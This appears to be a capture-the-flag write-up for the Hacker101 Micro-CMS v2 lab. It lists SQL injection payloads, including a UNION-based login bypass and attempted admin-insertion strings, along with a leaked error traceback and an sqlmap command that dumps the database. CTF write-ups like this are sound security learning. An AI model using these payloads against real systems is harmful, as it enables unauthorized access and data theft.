# Micro-CMS V2 solution

## Flags:

### Login page

Typing admin as username on login page gave Unknown user error but then I used `' or 1='1` and that gave me invalid password error.

Then I tried `' or 1='1' UNION SELECT 1,2;` which caused an error and showing me the exact SQL query being run, the type of DB and programming language used by the server.

```python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```

Then I started trying to insert a new admin user using some of the commands below but I could not get it to work.

```sql
'; INSERT INTO admins (id, username, password) values (99, 'admin', 'admin');--
'; INSERT INTO admins (password) values ('admin');--
```

Then I gave up and googled the answer which suggested this:

```sql
' UNION SELECT "xyz" as password FROM admins where ''='';--
```

Which can be simplified to this:

```sql
' UNION SELECT "xyz" as password;
```

So you can login by using the above as the username and `xyz` as the password

### Unprotected edit pages

You can post data directly to the edit page without being authenticated and it will accept it. see force-post.py

### Get username and password via SQLi

Thanks to the hints online I used [sqlmap](https://github.com/sqlmapproject/sqlmap) to essential dump the whole DB using a single command.

```shell
python sqlmap-dev/sqlmap.py -u https://a3e1b004a2d9bad3eb9d5e0d76494caf.ctf.hacker101.com/login \
  --data "username=a&password=b" -p username --dump
```
